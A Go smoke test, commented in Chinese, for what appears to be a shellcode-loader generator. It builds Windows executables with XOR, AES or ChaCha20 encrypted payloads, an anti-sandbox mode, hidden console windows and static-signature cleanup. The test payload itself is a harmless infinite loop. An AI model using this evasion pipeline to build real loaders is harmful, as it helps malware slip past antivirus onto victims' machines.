package util

import (
	"os"
	"os/exec"
	"path/filepath"
	"testing"
	"time"
)

// TestPostProcessRunSmoke 复现真实 /make 流水线：生成 -> 编译(win/amd64) ->
// PostProcessBuiltBinary(去黑窗口+静态特征清理) -> 运行，确认进程存活。
func TestPostProcessRunSmoke(t *testing.T) {
	if testing.Short() {
		t.Skip("short mode")
	}
	payload := []byte{0xEB, 0xFE} // x64 死循环
	dir := filepath.Join(os.TempDir(), "EasyTools", "file")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	os.WriteFile(filepath.Join(dir, "payload.bin"), payload, 0644)
	os.WriteFile(filepath.Join(dir, "XorEncrypted.txt"), payload, 0644)
	os.WriteFile(filepath.Join(dir, "XorKey.txt"), []byte{0x01, 0x02, 0x03, 0x04, 0x02}, 0644)
	os.WriteFile(filepath.Join(dir, "AesEncrypted.txt"), payload, 0644)
	os.WriteFile(filepath.Join(dir, "AesKey.txt"), []byte("0123456789abcdef0123456789abcdef"), 0644)
	os.WriteFile(filepath.Join(dir, "ChaCha20Encrypted.txt"), payload, 0644)
	os.WriteFile(filepath.Join(dir, "ChaCha20Key.txt"), make([]byte, 32), 0644)
	os.WriteFile(filepath.Join(dir, "ChaCha20Nonce.txt"), make([]byte, 12), 0644)
	os.WriteFile(filepath.Join(dir, "UrlOrFileEncrypted.txt"), []byte("deadbeef"), 0644)
	os.WriteFile(filepath.Join(dir, "UrlXorKey.txt"), []byte{0x42}, 0644)
	ensureGoModule(t)

	for _, tc := range []struct {
		loader  string
		loadWay string
		encode  string
		passBox string
	}{
		{"loader1", "一体", "xor", "否"},
		{"loader1", "一体", "xor", "双击运行"}, // UI 默认反沙箱模式
		{"loader5", "一体", "aes", "双击运行"},
		{mustWindowsLoader(t), "一体", "xor", "否"},
	} {
		out, gerr := GenGoFile(tc.loader, tc.loadWay, tc.encode, tc.passBox, "false", "false", "", "false", "", "", nil, nil)
		if gerr != nil || out == "" {
			t.Fatalf("[%s/%s] 生成失败: %v", tc.loader, tc.passBox, gerr)
		}
		bin := filepath.Join(dir, "pp_"+tc.loader+".exe")
		cmd := exec.Command("go", "build", "-o", bin, out)
		cmd.Dir = dir
		cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")
		if b, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("[%s/%s] 编译失败: %v\n%s", tc.loader, tc.passBox, err, b)
		}
		// 与真实 /make 一致的后处理（默认隐藏控制台）
		PostProcessBuiltBinary(bin, "windows", false)
		// 运行 1.5s：死循环 shellcode 应保持进程存活
		run := exec.Command(bin)
		if err := run.Start(); err != nil {
			t.Fatalf("[%s/%s] 启动失败: %v", tc.loader, tc.passBox, err)
		}
		time.Sleep(1500 * time.Millisecond)
		exited := run.ProcessState != nil && run.ProcessState.Exited()
		if exited {
			t.Errorf("[%s/%s] 进程提前退出（后处理后不可运行，exit=%v）", tc.loader, tc.passBox, run.ProcessState.ExitCode())
		} else {
			t.Logf("[%s/%s] 后处理后运行正常 ✓", tc.loader, tc.passBox)
			_ = run.Process.Kill()
		}
	}
}
